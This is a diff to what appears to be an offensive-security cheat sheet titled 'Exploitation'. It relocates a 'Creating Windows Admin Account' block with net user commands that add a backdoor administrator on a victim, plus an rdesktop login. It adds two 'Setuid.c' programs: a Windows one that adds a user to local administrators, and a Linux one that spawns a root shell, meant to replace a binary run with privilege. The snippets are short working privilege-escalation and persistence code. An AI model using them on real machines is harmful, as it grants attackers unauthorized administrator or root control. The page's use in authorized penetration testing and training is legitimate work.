@@ -6,16 +6,6 @@ title: Exploitation
 
 _Ensuring you don't have to re-exploit over and over again_
 
-## Creating Windows Admin Account
-```bash
-# Victim
-net user /add jack sparrow
-net localgroup administrators jack /add
-
-# Connect with
-rdesktop -u jim -p sparrow [IP-ADDRESS]
-```
-
 ## Executing in Memory - TMPFS
 
 ```bash
@@ -70,6 +60,32 @@ systeminfo # Copy & Paste this into a file on the attacker
 python windows-exploit-suggester.py --update
 
 python windows-exploit-suggester.py --database 20XX-YY-ZZ-mssb.xlsx --systeminfo systeminfo.txt
+```
+
+### Creating Windows Admin Account
+
+```bash
+# Victim
+net user /add jack sparrow
+net localgroup administrators jack /add
+
+# Connect with
+rdesktop -u jack -p sparrow [IP-ADDRESS]
+```
+
+### Setuid.c
+<sup><sub>[[archive](assets/files/win_setuid.c]
+
+If you can overwrite a binary that'll be run with priviledge, run this.
+
+```c
+#include <stdlib.h>
+int main()
+{
+    int i;
+    i = system("net localgroup administrators theusername /add");
+    return 0;
+}
 ```
 
 ### Windows Service / DLL Templates
@@ -163,6 +179,24 @@ schtasks /query /fo LIST /v > schtask.txt
 # Attacker
 cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 ```
+
+## Linux Privilege Escalation
+
+### Setuid.c
+<sup><sub>[[archive](assets/files/lin_setuid.c]
+
+If you can overwrite a binary that'll be run with priviledge, run this.
+
+```c
+int main(void)
+{
+    setgid(0);
+    setuid(0);
+    execl("/bin/sh", "sh", 0);
+}
+```
+
+### Setuid.c
 
 ## Exfiltration
 
